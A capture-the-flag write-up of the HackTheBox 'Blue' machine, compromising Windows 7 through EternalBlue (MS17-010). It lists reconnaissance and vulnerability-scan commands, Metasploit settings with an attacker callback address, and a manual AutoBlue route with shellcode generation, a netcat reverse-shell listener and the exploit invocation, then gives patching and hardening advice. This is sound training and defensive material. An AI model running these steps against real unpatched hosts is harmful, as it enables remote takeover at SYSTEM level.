---
title: "HackTheBox: Blue - EternalBlue (MS17-010) Exploitation"
date: 2026-02-20
draft: false
description: "Walkthrough of the HackTheBox Blue machine, exploiting the infamous EternalBlue vulnerability (MS17-010) to gain SYSTEM access on Windows 7."
tags: ["hackthebox", "windows", "eternalblue", "ms17-010", "smb"]
---

## Introduction

Blue is a Windows machine on HackTheBox that's vulnerable to **EternalBlue (MS17-010)** — the same exploit used in the devastating WannaCry ransomware attack in 2017. This box is a great introduction to exploiting SMB vulnerabilities and understanding why patching is critical.

**Difficulty:** Easy  
**OS:** Windows 7 Professional SP1  
**Skills:** SMB enumeration, EternalBlue exploitation

---

## Reconnaissance

### Nmap Scan

Started with a standard nmap scan to identify open ports and services:
```bash
nmap -sC -sV -Pn 10.129.4.126
```

Key findings:

| Port | Service | Version |
|------|---------|---------|
| 135 | MSRPC | Microsoft Windows RPC |
| 139 | NetBIOS | Microsoft Windows netbios-ssn |
| 445 | SMB | Windows 7 Professional 7601 SP1 |

The target is running **Windows 7 Professional SP1** with SMB exposed. This immediately made me think of EternalBlue.

---

## Vulnerability Assessment

### Checking for MS17-010

I used nmap's SMB vulnerability script to confirm the target is vulnerable:
```bash
nmap --script smb-vuln-ms17-010 -p 445 10.129.4.126
```

![Nmap vulnerability scan showing MS17-010 is VULNERABLE](/images/htb-blue/blue_1.png)

The scan confirmed:
- **State:** VULNERABLE
- **CVE:** CVE-2017-0143
- **Risk Factor:** HIGH

This is EternalBlue — a critical remote code execution vulnerability in Microsoft's SMBv1 implementation.

---

## What is EternalBlue?

EternalBlue (MS17-010) is a vulnerability in Microsoft's implementation of the Server Message Block (SMB) protocol. Key facts:

| Aspect | Details |
|--------|---------|
| **Discovered by** | NSA (leaked by Shadow Brokers in 2017) |
| **CVE** | CVE-2017-0143 through CVE-2017-0148 |
| **Impact** | Remote code execution with SYSTEM privileges |
| **Famous for** | Used in WannaCry and NotPetya ransomware |

The vulnerability exists in how SMBv1 handles certain requests, allowing an attacker to execute arbitrary code in kernel mode.

---

## Exploitation

### Using Metasploit

For this box, I used Metasploit's EternalBlue module:
```bash
msfconsole
```
```
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.129.4.126
set LHOST 10.10.15.65
run
```

![Metasploit exploitation process](/images/htb-blue/blue_2.png)

The exploit:
1. Confirmed the target is vulnerable
2. Performed **pool grooming** (12 groom allocations)
3. Sent the exploit packet
4. **ETERNALBLUE overwrite completed successfully!**
5. Returned a Meterpreter shell

---

## Post-Exploitation

### SYSTEM Access

Once the exploit completed, I had a Meterpreter session. I dropped into a shell to verify access:
```
meterpreter > shell
```
```
C:\Windows\system32>whoami
nt authority\system
```

![SYSTEM shell access](/images/htb-blue/blue_3.png)

**We have SYSTEM access!** This is the highest privilege level on a Windows machine.

---

## Capturing the Flags

### User Flag
```
cd C:\Users
dir /s user.txt
type C:\Users\haris\Desktop\user.txt
```

### Root Flag
```
type C:\Users\Administrator\Desktop\root.txt
```

---

## Alternative: Manual Exploitation (No Metasploit)

For OSCP practice, I also exploited this manually using AutoBlue:

### 1. Clone AutoBlue
```bash
git clone https://github.com/3ndG4me/AutoBlue-MS17-010.git
cd AutoBlue-MS17-010
pip install impacket
```

### 2. Generate Shellcode
```bash
cd shellcode
./shell_prep.sh
```

Enter your IP and port when prompted.

### 3. Set Up Listener
```bash
nc -lvnp 4444
```

### 4. Run Exploit
```bash
python3 eternalblue_exploit7.py 10.129.4.126 shellcode/sc_x64.bin
```

---

## Key Takeaways

### Why This Vulnerability is Critical

1. **No authentication required** — Attacker only needs network access to port 445
2. **Remote code execution** — Full control from across the network
3. **SYSTEM privileges** — Highest possible access on Windows
4. **Wormable** — Can spread automatically (like WannaCry did)

### Defensive Measures

| Action | Priority |
|--------|----------|
| Disable SMBv1 | High |
| Apply MS17-010 patch | Critical |
| Block port 445 at firewall | High |
| Network segmentation | Medium |
| Regular patching schedule | Ongoing |

---

## Lessons Learned

1. **Always check for known vulnerabilities** — A simple nmap script identified this critical flaw
2. **Understand the exploit** — EternalBlue targets kernel memory, giving SYSTEM access
3. **Manual exploitation matters** — Metasploit is easy, but understanding the manual process is valuable for OSCP and real-world scenarios
4. **Patching is critical** — This vulnerability was patched in March 2017, yet unpatched systems still exist

---

## Resources

- [Microsoft Security Bulletin MS17-010](https://docs.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010)
- [CVE-2017-0143](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143)
- [AutoBlue-MS17-010](https://github.com/3ndG4me/AutoBlue-MS17-010)

---

## Tools Used

- Nmap
- Metasploit Framework
- AutoBlue-MS17-010
- Netcat

---

*This writeup is for educational purposes. Only test on systems you have permission to access.*
